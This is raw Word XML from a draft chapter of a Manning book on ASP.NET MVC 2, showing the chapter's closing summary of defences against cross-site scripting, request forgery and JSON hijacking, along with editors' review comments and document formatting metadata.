        <w:t>No application can ever be totally secure, but in this chapter we learned about several vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="007305C4">
        <w:instrText>vulnerabilities</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and how we can protect our ASP.NET MVC 2 applications.  We explored using the </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE5723">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>AuthorizeAttribute</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="002A6483">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:instrText>AuthorizeAttribute</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to enforce authentication</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00916EC9">
        <w:instrText>authentication</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and authorization</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="0035243A">
        <w:instrText>authorization</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on actions.  We understood cross site scripting</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00AC59FB">
        <w:instrText>cross site scripting</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and learned to never trust user input and </w:t>
      </w:r>
      <w:r w:rsidR="00BA7670">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:t>HTML</w:t>
      </w:r>
      <w:r w:rsidR="007C2B17">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>encode</w:t>
      </w:r>
      <w:ins w:id="477" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="00B74B32">
        <w:rPr>
          <w:rPrChange w:id="478" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>HTML encode</w:instrText>
      </w:r>
      <w:ins w:id="479" w:author="Jeffrey" w:date="2010-03-15T16:33:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> all output.  Cross site request forgeries are neutered when the </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE5723">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>ValidateAntiForgerTokenAttribute</w:t>
      </w:r>
      <w:ins w:id="480" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="007B5F51">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="007B5F51">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="007B5F51" w:rsidRPr="00CE3ABB">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="481" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>ValidateAntiForgerTokenAttribute</w:instrText>
      </w:r>
      <w:ins w:id="482" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="007B5F51">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="007B5F51">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> is used to verify that input is coming from </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">trusted </w:t>
      </w:r>
      <w:r w:rsidR="00BA7670">
        <w:t>sources</w:t>
      </w:r>
      <w:r>
        <w:t>.  We learned how ASP.NET MVC 2 helps protect against JSON</w:t>
      </w:r>
      <w:ins w:id="483" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rPrChange w:id="484" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JSON</w:instrText>
      </w:r>
      <w:ins w:id="485" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> hijacking</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="005828C7">
        <w:instrText>JSON hijacking</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and how to explicit</w:t>
      </w:r>
      <w:r w:rsidR="00BA7670">
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y work-around the changes to </w:t>
      </w:r>
      <w:r w:rsidRPr="00EE5723">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
        </w:rPr>
        <w:t>JsonResult</w:t>
      </w:r>
      <w:ins w:id="486" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00790D2C">
        <w:rPr>
          <w:rStyle w:val="CodeinText"/>
          <w:rPrChange w:id="487" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
            <w:rPr>
              <w:rStyle w:val="CodeinText"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JsonResult</w:instrText>
      </w:r>
      <w:ins w:id="488" w:author="Jeffrey" w:date="2010-03-15T16:36:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:rPr>
            <w:rStyle w:val="CodeinText"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EE5723" w:rsidRPr="00EE5723" w:rsidRDefault="00EE5723" w:rsidP="00EE5723">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>In the next chapter, we'll dive into AJAX, using it to create rich user experiences and responsive applications.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00EE5723" w:rsidRPr="00EE5723" w:rsidSect="00B92776">
      <w:headerReference w:type="even" r:id="rId17"/>
      <w:headerReference w:type="default" r:id="rId18"/>
      <w:footerReference w:type="even" r:id="rId19"/>
      <w:footerReference w:type="default" r:id="rId20"/>
      <w:footerReference w:type="first" r:id="rId21"/>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 w:author="JSkinner" w:date="2010-03-02T18:37:00Z" w:initials="JS">
    <w:p w:rsidR="000968D7" w:rsidRDefault="000968D7">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Minor rewording as this sounded a bit clumsy. </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="13" w:author="Jeffrey" w:date="2010-03-15T16:37:00Z" w:initials="J">
    <w:p w:rsidR="00506E62" w:rsidRDefault="00506E62">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>thanks</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="48" w:author="JSkinner" w:date="2010-03-02T18:42:00Z" w:initials="JS">
    <w:p w:rsidR="00006618" w:rsidRDefault="00006618">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Is this supposed to be in a bulleted list?</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="49" w:author="Jeffrey" w:date="2010-03-15T16:38:00Z" w:initials="J">
    <w:p w:rsidR="00375C9A" w:rsidRDefault="00375C9A">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>No.  fixed</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="99" w:author="Katharine Osborne" w:date="2010-02-06T23:40:00Z" w:initials="KO">
    <w:p w:rsidR="00A96356" w:rsidRDefault="00A96356">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Dashes used to show a pause should be em dashes (type the dash character twice to get an em dash in Word). Just FYI.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="100" w:author="Jeffrey" w:date="2010-02-18T15:58:00Z" w:initials="J">
    <w:p w:rsidR="00D17F2F" w:rsidRDefault="00D17F2F">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Tried it.  I need help </w:t>
      </w:r>
      <w:r w:rsidRPr="00D17F2F">
        <w:sym w:font="Wingdings" w:char="F04C"/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="104" w:author="Katharine Osborne" w:date="2010-02-20T19:43:00Z" w:initials="KO">
    <w:p w:rsidR="001F537D" w:rsidRDefault="001F537D">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>That’s odd that it didn’t work for you. No problem though, we can deal with this in copy editing.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="105" w:author="JSkinner" w:date="2010-03-02T18:31:00Z" w:initials="JS">
    <w:p w:rsidR="00182573" w:rsidRDefault="00182573">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>FYI to insert an em dash in Word 2007 you can use ctrl+alt+numpad minus</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="115" w:author="JSkinner" w:date="2010-03-03T18:06:00Z" w:initials="JS">
    <w:p w:rsidR="00BE308B" w:rsidRDefault="00BE308B">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I couldn't get this sample to work in Chrome. I didn't realise that Chrome prevented these vulnerabilities until I read your note later in the chapter. I wonder if it would be worth including it sooner?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BE308B" w:rsidRDefault="00BE308B"/>
  </w:comment>
  <w:comment w:id="116" w:author="Jeffrey" w:date="2010-03-15T16:40:00Z" w:initials="J">
    <w:p w:rsidR="00C068E0" w:rsidRDefault="00C068E0">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>I added a note about running it in Internet Explorer</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="202" w:author="JSkinner" w:date="2010-03-02T19:01:00Z" w:initials="JS">
    <w:p w:rsidR="00DE1364" w:rsidRDefault="00DE1364">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Generally recommended to use Html.Encode rather than HttpUtility.HtmlEncode</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="203" w:author="Jeffrey" w:date="2010-03-15T16:40:00Z" w:initials="J">
    <w:p w:rsidR="00321631" w:rsidRDefault="00321631">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>thanks</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="210" w:author="Katharine Osborne" w:date="2010-02-06T23:47:00Z" w:initials="KO">
    <w:p w:rsidR="00A96356" w:rsidRDefault="00A96356">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r w:rsidRPr="00A96356">
        <w:t>http://mng.bz/Z3V5</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="211" w:author="Jeffrey" w:date="2010-02-18T16:01:00Z" w:initials="J">
    <w:p w:rsidR="009922FB" w:rsidRDefault="009922FB">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>We'll do a URL sweep before typesetting.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="398" w:author="JSkinner" w:date="2010-03-03T17:59:00Z" w:initials="JS">
    <w:p w:rsidR="003C6B7A" w:rsidRDefault="003C6B7A">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Fixed indenting. </w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="399" w:author="Jeffrey" w:date="2010-03-15T16:41:00Z" w:initials="J">
    <w:p w:rsidR="001C06F0" w:rsidRDefault="001C06F0">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>thanks</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="457" w:author="JSkinner" w:date="2010-03-03T17:59:00Z" w:initials="JS">
    <w:p w:rsidR="003C6B7A" w:rsidRDefault="003C6B7A">
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>Fixed indenting.</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="458" w:author="Jeffrey" w:date="2010-03-15T16:41:00Z" w:initials="J">
    <w:p w:rsidR="001C06F0" w:rsidRDefault="001C06F0">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:t>thanks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736A" w:rsidRDefault="005F736A">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F736A" w:rsidRDefault="005F736A"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="005F736A" w:rsidRDefault="005F736A">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F736A" w:rsidRDefault="005F736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356" w:rsidRPr="00553572" w:rsidRDefault="00A96356" w:rsidP="00553572">
    <w:pPr>
      <w:pStyle w:val="Body1"/>
    </w:pPr>
    <w:r>
      <w:t xml:space="preserve">©Manning Publications Co. </w:t>
    </w:r>
    <w:r w:rsidRPr="00553572">
      <w:t>Please post comments or corrections to the Author Online forum:</w:t>
    </w:r>
  </w:p>
  <w:p w:rsidR="00A96356" w:rsidRPr="00DB3E55" w:rsidRDefault="00A96356"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356" w:rsidRPr="00553572" w:rsidRDefault="00A96356" w:rsidP="00553572">
    <w:pPr>
      <w:pStyle w:val="Body1"/>
    </w:pPr>
    <w:r>
      <w:t xml:space="preserve">©Manning Publications Co. </w:t>
    </w:r>
    <w:r w:rsidRPr="00553572">
      <w:t>Please post comments or corrections to the Author Online forum:</w:t>
    </w:r>
  </w:p>
  <w:p w:rsidR="00A96356" w:rsidRPr="00DB3E55" w:rsidRDefault="00A96356"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356" w:rsidRDefault="00A96356"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736A" w:rsidRDefault="005F736A">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F736A" w:rsidRDefault="005F736A"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="005F736A" w:rsidRDefault="005F736A">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F736A" w:rsidRDefault="005F736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356" w:rsidRPr="00553572" w:rsidRDefault="00705E20" w:rsidP="00D97E72">
    <w:pPr>
      <w:pStyle w:val="Body1"/>
      <w:tabs>
        <w:tab w:val="center" w:pos="3600"/>
        <w:tab w:val="right" w:pos="7200"/>
      </w:tabs>
    </w:pPr>
    <w:fldSimple w:instr="PAGE  ">
      <w:r w:rsidR="001C06F0">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
    </w:fldSimple>
    <w:r w:rsidR="00A96356" w:rsidRPr="00553572">
      <w:tab/>
    </w:r>
    <w:r w:rsidR="00A96356">
      <w:tab/>
    </w:r>
    <w:r w:rsidR="00A96356" w:rsidRPr="00553572">
      <w:rPr>
        <w:rStyle w:val="BoldItalics"/>
      </w:rPr>
      <w:t>Author</w:t>
    </w:r>
    <w:r w:rsidR="00A96356" w:rsidRPr="00553572">
      <w:t xml:space="preserve"> / </w:t>
    </w:r>
    <w:r w:rsidR="00A96356" w:rsidRPr="00553572">
      <w:rPr>
        <w:rStyle w:val="BoldItalics"/>
      </w:rPr>
      <w:t>Title</w:t>
    </w:r>
    <w:r w:rsidR="00A96356" w:rsidRPr="00553572">
      <w:tab/>
      <w:t xml:space="preserve">Last saved: </w:t>
    </w:r>
    <w:fldSimple w:instr=" SAVEDATE  \@ &quot;M/d/yyyy&quot;  \* MERGEFORMAT ">
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3/3/2010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356" w:rsidRPr="00553572" w:rsidRDefault="00A96356" w:rsidP="00B92776">
    <w:pPr>
      <w:pStyle w:val="Body1"/>
      <w:tabs>
        <w:tab w:val="right" w:pos="360"/>
        <w:tab w:val="center" w:pos="4320"/>
        <w:tab w:val="left" w:pos="7200"/>
      </w:tabs>
    </w:pPr>
    <w:r>
      <w:t xml:space="preserve">Last saved: </w:t>
    </w:r>
    <w:fldSimple w:instr=" SAVEDATE  \@ &quot;M/d/yyyy&quot;  \* MERGEFORMAT ">
      <w:r w:rsidR="004962CC">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3/3/2010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1C06F0">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formsDesign/>
  <w:attachedTemplate r:id="rId1"/>
  <w:stylePaneFormatFilter w:val="3701"/>
  <w:trackRevisions/>
  <w:doNotTrackMoves/>
  <w:documentProtection w:formatting="1" w:enforcement="0"/>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1266"/>
  </w:hdrShapeDefaults>
  <w:footnotePr>
    <w:numRestart w:val="eachSect"/>
    <w:footnote w:id="-1"/>
    <w:footnote w:id="0"/>
  </w:footnotePr>
  <w:endnotePr>
    <w:endnote w:id="-1"/>
    <w:endnote w:id="0"/>
  </w:endnotePr>
  <w:compat/>
  <w:rsids>
    <w:rsidRoot w:val="00B3368B"/>
    <w:rsid w:val="00006618"/>
    <w:rsid w:val="00011EF3"/>
    <w:rsid w:val="0001713C"/>
    <w:rsid w:val="00020104"/>
    <w:rsid w:val="00025E13"/>
    <w:rsid w:val="000275ED"/>
    <w:rsid w:val="0003082E"/>
    <w:rsid w:val="00042567"/>
    <w:rsid w:val="00051CCD"/>
    <w:rsid w:val="000602CA"/>
    <w:rsid w:val="000616FF"/>
    <w:rsid w:val="00062749"/>
    <w:rsid w:val="00064A72"/>
    <w:rsid w:val="00066200"/>
    <w:rsid w:val="00075153"/>
    <w:rsid w:val="000812E7"/>
    <w:rsid w:val="00085C8C"/>
    <w:rsid w:val="00092916"/>
    <w:rsid w:val="00093DF4"/>
    <w:rsid w:val="000943A3"/>
    <w:rsid w:val="000968D7"/>
    <w:rsid w:val="000A091E"/>
    <w:rsid w:val="000C29BD"/>
    <w:rsid w:val="000D356E"/>
    <w:rsid w:val="000E63C0"/>
    <w:rsid w:val="000E6D5F"/>
    <w:rsid w:val="000E7F67"/>
    <w:rsid w:val="000F0DEC"/>
    <w:rsid w:val="00103F76"/>
    <w:rsid w:val="0010772E"/>
    <w:rsid w:val="001152FB"/>
    <w:rsid w:val="00116A8C"/>
    <w:rsid w:val="001177C3"/>
    <w:rsid w:val="0012713F"/>
    <w:rsid w:val="00135744"/>
    <w:rsid w:val="00142662"/>
    <w:rsid w:val="0014456E"/>
    <w:rsid w:val="001537C4"/>
    <w:rsid w:val="00154EBA"/>
    <w:rsid w:val="00155FBB"/>
    <w:rsid w:val="00157250"/>
    <w:rsid w:val="00160CEF"/>
    <w:rsid w:val="0016350A"/>
    <w:rsid w:val="001716E6"/>
    <w:rsid w:val="00182300"/>
    <w:rsid w:val="00182573"/>
    <w:rsid w:val="00183C24"/>
    <w:rsid w:val="0018654A"/>
    <w:rsid w:val="0019098A"/>
    <w:rsid w:val="00191A68"/>
    <w:rsid w:val="00194736"/>
    <w:rsid w:val="00194C1A"/>
    <w:rsid w:val="001A0B2C"/>
    <w:rsid w:val="001B32A0"/>
    <w:rsid w:val="001B619E"/>
    <w:rsid w:val="001B76AB"/>
    <w:rsid w:val="001C06F0"/>
    <w:rsid w:val="001C1997"/>
    <w:rsid w:val="001C5C5B"/>
    <w:rsid w:val="001C6896"/>
    <w:rsid w:val="001C797E"/>
    <w:rsid w:val="001D69EB"/>
    <w:rsid w:val="001D6E79"/>
    <w:rsid w:val="001F21FC"/>
    <w:rsid w:val="001F537D"/>
    <w:rsid w:val="001F53BD"/>
    <w:rsid w:val="00210213"/>
    <w:rsid w:val="00214673"/>
    <w:rsid w:val="0021551B"/>
    <w:rsid w:val="00215BF2"/>
    <w:rsid w:val="00216FEC"/>
    <w:rsid w:val="00224060"/>
    <w:rsid w:val="00227CF4"/>
    <w:rsid w:val="00242879"/>
    <w:rsid w:val="0025094B"/>
    <w:rsid w:val="00263F76"/>
    <w:rsid w:val="00275591"/>
    <w:rsid w:val="002867B1"/>
    <w:rsid w:val="00290557"/>
    <w:rsid w:val="002916AA"/>
    <w:rsid w:val="00291EEA"/>
    <w:rsid w:val="002921BB"/>
    <w:rsid w:val="002B6FE6"/>
    <w:rsid w:val="002D1A58"/>
    <w:rsid w:val="002D24E6"/>
    <w:rsid w:val="002D28DB"/>
    <w:rsid w:val="002F1201"/>
    <w:rsid w:val="002F4D34"/>
    <w:rsid w:val="00303323"/>
    <w:rsid w:val="00305BDC"/>
    <w:rsid w:val="00307203"/>
    <w:rsid w:val="0031190B"/>
    <w:rsid w:val="00316128"/>
    <w:rsid w:val="00321631"/>
    <w:rsid w:val="003217CA"/>
    <w:rsid w:val="00326F66"/>
    <w:rsid w:val="00327B8E"/>
    <w:rsid w:val="00331DA7"/>
    <w:rsid w:val="00360455"/>
    <w:rsid w:val="00363155"/>
    <w:rsid w:val="00375C9A"/>
    <w:rsid w:val="00376157"/>
    <w:rsid w:val="003848AA"/>
    <w:rsid w:val="003A1EA1"/>
    <w:rsid w:val="003A36BE"/>
    <w:rsid w:val="003A3CE7"/>
    <w:rsid w:val="003B62DA"/>
    <w:rsid w:val="003C2391"/>
    <w:rsid w:val="003C4522"/>
    <w:rsid w:val="003C4FE4"/>
    <w:rsid w:val="003C6B7A"/>
    <w:rsid w:val="003E4AE2"/>
    <w:rsid w:val="003F3294"/>
    <w:rsid w:val="00406A27"/>
    <w:rsid w:val="00411C9E"/>
    <w:rsid w:val="004216EF"/>
    <w:rsid w:val="00430E59"/>
    <w:rsid w:val="00447B18"/>
    <w:rsid w:val="00453B8A"/>
    <w:rsid w:val="00471E42"/>
    <w:rsid w:val="00472589"/>
    <w:rsid w:val="0048007C"/>
    <w:rsid w:val="00491541"/>
    <w:rsid w:val="00491BFB"/>
    <w:rsid w:val="00495AD7"/>
    <w:rsid w:val="004962CC"/>
    <w:rsid w:val="00496FD1"/>
    <w:rsid w:val="004A44C7"/>
    <w:rsid w:val="004C330F"/>
    <w:rsid w:val="004C6653"/>
    <w:rsid w:val="004C79FF"/>
    <w:rsid w:val="004D5449"/>
    <w:rsid w:val="00502BBA"/>
    <w:rsid w:val="005063F2"/>
    <w:rsid w:val="0050648E"/>
    <w:rsid w:val="00506E62"/>
    <w:rsid w:val="00511E7A"/>
    <w:rsid w:val="00516647"/>
    <w:rsid w:val="00517E4D"/>
    <w:rsid w:val="00524056"/>
    <w:rsid w:val="00530196"/>
    <w:rsid w:val="00535E09"/>
    <w:rsid w:val="00544692"/>
    <w:rsid w:val="005524D4"/>
    <w:rsid w:val="00553572"/>
    <w:rsid w:val="0058466D"/>
    <w:rsid w:val="005A16A8"/>
    <w:rsid w:val="005A2A40"/>
    <w:rsid w:val="005A5837"/>
    <w:rsid w:val="005B1BA2"/>
    <w:rsid w:val="005B5616"/>
    <w:rsid w:val="005C65A8"/>
    <w:rsid w:val="005D2F86"/>
    <w:rsid w:val="005D3A9F"/>
    <w:rsid w:val="005D7972"/>
    <w:rsid w:val="005F1BFA"/>
    <w:rsid w:val="005F736A"/>
    <w:rsid w:val="006024A5"/>
    <w:rsid w:val="006150B4"/>
    <w:rsid w:val="006155CC"/>
    <w:rsid w:val="00620AFB"/>
    <w:rsid w:val="006305BF"/>
    <w:rsid w:val="00633001"/>
    <w:rsid w:val="0064126F"/>
    <w:rsid w:val="00644D70"/>
    <w:rsid w:val="00652905"/>
    <w:rsid w:val="00656211"/>
    <w:rsid w:val="00665DBB"/>
    <w:rsid w:val="006664F9"/>
    <w:rsid w:val="00683071"/>
    <w:rsid w:val="00693F51"/>
    <w:rsid w:val="006A3B75"/>
    <w:rsid w:val="006A6489"/>
    <w:rsid w:val="006B719F"/>
    <w:rsid w:val="006C15A8"/>
    <w:rsid w:val="006C619B"/>
    <w:rsid w:val="006C7FA8"/>
    <w:rsid w:val="006D447A"/>
    <w:rsid w:val="006D600C"/>
    <w:rsid w:val="006D70D7"/>
    <w:rsid w:val="006D7A63"/>
    <w:rsid w:val="006E1E21"/>
    <w:rsid w:val="006E57C0"/>
    <w:rsid w:val="006E6069"/>
    <w:rsid w:val="006E6B97"/>
    <w:rsid w:val="006F31AF"/>
    <w:rsid w:val="0070096E"/>
    <w:rsid w:val="00705CBB"/>
